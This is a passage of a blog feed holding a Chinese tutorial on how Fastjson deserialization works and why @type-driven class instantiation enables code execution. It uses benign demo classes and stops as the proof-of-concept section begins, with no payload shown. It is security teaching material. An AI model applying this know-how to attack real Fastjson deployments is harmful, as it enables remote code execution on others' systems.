      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson系列一——反序列化漏洞基本原理</title>
    <link href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
    <id>https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/</id>
    <published>2019-11-03T10:51:00.000Z</published>
    <updated>2019-11-06T15:14:33.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h3><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。</p><p>项目地址：<a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener">https://github.com/alibaba/fastjson</a></p><h3 id="使用Fastjson进行序列化和反序列化"><a href="#使用Fastjson进行序列化和反序列化" class="headerlink" title="使用Fastjson进行序列化和反序列化"></a>使用Fastjson进行序列化和反序列化</h3><p>这里通过Demo了解下如何使用Fastjson进行序列化和反序列化，以及其中的一些特性之间的区别等等。</p><p>Student.java，定义的一个学生类，其中包含两个属性及其getter/setter方法，还有类的构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FJTest.java，调用JSON.toJsonString()来序列化Student类对象 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">"Mi1k7ea"</span>);</span><br><span class="line">        student.setAge(<span class="number">6</span>);</span><br><span class="line">        String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter/setter/is方法。</strong></p><p>Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</p><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 设置了SerializerFeature.WriteClassName</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Student&quot;,&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;</span><br><span class="line"></span><br><span class="line">// 未设置SerializerFeature.WriteClassName</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;</span><br></pre></td></tr></table></figure><p>FJTest2.java，调用JSON.parseObject()反序列化JSON为对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\"&#125;"</span>;</span><br><span class="line">        Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">Student@75b9fd80</span><br><span class="line">Student</span><br></pre></td></tr></table></figure><h3 id="反序列化类图"><a href="#反序列化类图" class="headerlink" title="反序列化类图"></a>反序列化类图</h3><p>Fastjson反序列化的类方法调用关系如图：</p><p><img src="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/2.png" alt=""></p><p>JSON：门面类，提供入口 </p><p>DefaultJSONParser：主类 </p><p>ParserConfig：配置相关类 </p><p>JSONLexerBase：字符分析类 </p><p>JavaBeanDeserializer：JavaBean反序列化类</p><h3 id="Feature-SupportNonPublicField"><a href="#Feature-SupportNonPublicField" class="headerlink" title="Feature.SupportNonPublicField"></a>Feature.SupportNonPublicField</h3><p>如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。</p><p>这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，加了就没必要声明为private了）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;</span></span><br><span class="line"><span class="comment">//        System.out.println("setAge");</span></span><br><span class="line"><span class="comment">//        this.age = age;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改FJTest2.java，去掉Feature.SupportNonPublicField，添加输出两个属性getter方法的返回值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\"&#125;"</span>;</span><br><span class="line">        Student obj = JSON.parseObject(jsonstring, Student.class);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">        System.out.println(obj.getName() + <span class="string">" "</span> + obj.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新运行，会看到获取不到私有变量age的值而是被设置为0：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@7addc524</span><br><span class="line">Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">Mi1k7ea 0</span><br></pre></td></tr></table></figure><p>接着添加Feature.SupportNonPublicField：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>再输出就能成功还原出age这个私有变量的值了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@2c59109c</span><br><span class="line">Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">Mi1k7ea 6</span><br></pre></td></tr></table></figure><p>也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。</p><h3 id="反序列化时几种类型设置的比较"><a href="#反序列化时几种类型设置的比较" class="headerlink" title="反序列化时几种类型设置的比较"></a>反序列化时几种类型设置的比较</h3><p>再来看下parseObject()的指定或不指定反序列化类型之间的差异。</p><p>由于Fastjson反序列化漏洞的利用只和包含了@type的JSON数据有关，因此这里我们只对序列化时设置了SerializerFeature.WriteClassName即含有@type指定反序列化类型的JSON数据进行反序列化；对于未包含@type的情况这里不做探讨，可自行测试。</p><p>修改Student类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法（既然是private也没必要定义）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAddress"</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProperties"</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="未设置Feature-SupportNonPublicField"><a href="#未设置Feature-SupportNonPublicField" class="headerlink" title="未设置Feature.SupportNonPublicField"></a>未设置Feature.SupportNonPublicField</h4><p>修改FJTest2.java，先是默认调用parseObject()不带指定类型的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\",\"address\":\"china\",\"properties\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parseObject(jsonstring);</span><br><span class="line">        <span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line">        <span class="comment">//JSONObject obj = JSON.parseObject(jsonstring);</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，调用了Student类的构造函数、所有属性的getter方法、JSON里面非私有属性的setter方法，其中getProperties()调用了两次；无论定义的对象是Object还是JSONObject，最后反序列化得到的都是JSONObject类对象，可以看到是未反序列化成功的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">getAddress</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getProperties</span><br><span class="line">&#123;&quot;name&quot;:&quot;Mi1k7ea&quot;,&quot;age&quot;:0&#125;</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure><p>接着在FJTest2.java中修改反序列化代码语句如下，加上指定反序列化得到的类型为Object.class或Student.class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object obj = JSON.parseObject(jsonstring, Object.class);</span><br><span class="line"><span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//Object obj = JSON.parseObject(jsonstring, Student.class);</span></span><br><span class="line"><span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//Student obj = JSON.parseObject(jsonstring, Student.class);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 另外，JSONObject类不支持这种写法</span></span><br></pre></td></tr></table></figure><p>输出看到，调用了Student类的构造函数、JSON里面非私有属性的setter方法、properties成员变量的的getter方法，反序列化得到的是Student类对象即反序列化成功，也就是说<strong>只要添加了指定的类这个参数，通过@type的作用parseObject()都会成功将JSON反序列化为@type指定的类</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">Student@ca140c2</span><br><span class="line">Student</span><br></pre></td></tr></table></figure><h4 id="设置Feature-SupportNonPublicField"><a href="#设置Feature-SupportNonPublicField" class="headerlink" title="设置Feature.SupportNonPublicField"></a>设置Feature.SupportNonPublicField</h4><p>修改FJTest2.java中反序列化代码语句如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</span><br><span class="line"><span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//Object obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span></span><br><span class="line"><span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span></span><br></pre></td></tr></table></figure><p>输出，发现和未设置Feature.SupportNonPublicField的是一致的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">Student@4c00c0cf</span><br><span class="line">Student</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>根据前面的结果，有如下结论：</p><ul><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；</li><li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li></ul><p><strong>下面直接引用结论，Fastjson会对满足下列要求的setter/getter方法进行调用：</strong></p><p>满足条件的setter：</p><ul><li>函数名长度大于4且以set开头</li><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>函数名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul><p>注意，除了getter方法和setter方法外，还有个is方法这里没有列举，可自行测试。</p><p>前面的properties私有属性，其类型为Properties，而Properties是继承于Hashtable，Hashtable是实现Map接口类的类，因此properties私有属性的getter方法时继承自Map，从而能够成功被Fastjson调用。</p><h3 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h3><p>前面的demo都是用parseObject()演示的，还没说到parse()。两者主要的区别就是parseObject()返回的是JSONObject而parse()返回的是实际类型的对象，当在没有对应类的定义的情况下，一般情况下都会使用JSON.parseObject()来获取数据。</p><blockquote><p>FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</p></blockquote><p>也就是说，我们用parse()反序列化会直接得到特定的类，而无需像parseObject()一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。</p><p>修改FJTest2.java中的parseObject()为parse()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\",\"address\":\"china\",\"properties\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parse(jsonstring);</span><br><span class="line">        <span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//        Object obj = JSON.parse(jsonstring, Feature.SupportNonPublicField);</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">Student@398600d7</span><br><span class="line">Student</span><br></pre></td></tr></table></figure><h2 id="0x02-Fastjson反序列化漏洞原理"><a href="#0x02-Fastjson反序列化漏洞原理" class="headerlink" title="0x02 Fastjson反序列化漏洞原理"></a>0x02 Fastjson反序列化漏洞原理</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。</p><p>通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。</p><p><strong>那么如何才能够反序列化出恶意类呢？</strong></p><p>由前面demo知道，Fastjson使用parseObject()/parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p><p><strong>接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？</strong></p><p>由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。</p><p>我们到DefaultJSONParser.parseObject(Map object, Object fieldName)中看下，JSON中以@type形式传入的类的时候，调用deserializer.deserialize()处理该类，并去调用这个类的setter和getter方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(&#123; <span class="string">"unchecked"</span>, <span class="string">"rawtypes"</span> &#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// JSON.DEFAULT_TYPE_KEY即@type</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">...</span><br><span class="line">        ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure><p>整个解析过程相当复杂，知道结论就ok了。</p><p><strong>小结一下</strong></p><p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(text, Student.class);</code>，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(text, Object.class);</code>，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><h3 id="PoC写法"><a href="#PoC写法" class="headerlink" title="PoC写法"></a>PoC写法</h3><p>一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span 